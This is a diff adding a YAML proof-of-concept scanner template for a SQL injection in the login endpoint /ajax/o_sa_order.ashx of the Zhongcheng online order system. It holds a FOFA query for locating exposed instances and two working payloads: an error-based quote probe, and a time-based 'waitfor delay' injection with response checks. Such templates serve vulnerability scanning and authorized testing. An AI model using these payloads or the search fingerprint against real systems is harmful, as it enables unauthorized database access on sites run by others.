@@ -1,0 +1,27 @@
+id: poc-yaml-zcsoft-o-sa-order-ashx-sqli
+info:
+  name: 众诚网上订单系统 o_sa_order.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 众诚网上订单系统
+  fofa: title="欢迎使用众诚网上订单系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /ajax/o_sa_order.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: Type=login&user_id=admin'&user_pwd=1111111
+  expression: "status_code == 200 && \ncontains(body,\"附近有语法错误\") &&\n!contains(body,\"\
+    <\")\n"
+- method: POST
+  path: /ajax/o_sa_order.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: Type=login&user_id=admin');waitfor+delay+'0:0:{{.t1}}'--&user_pwd=1111111
+  expression: "status_code == 200 && \ncontains(body,\"登陆失败\") &&\n!contains(body,\"\
+    <\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
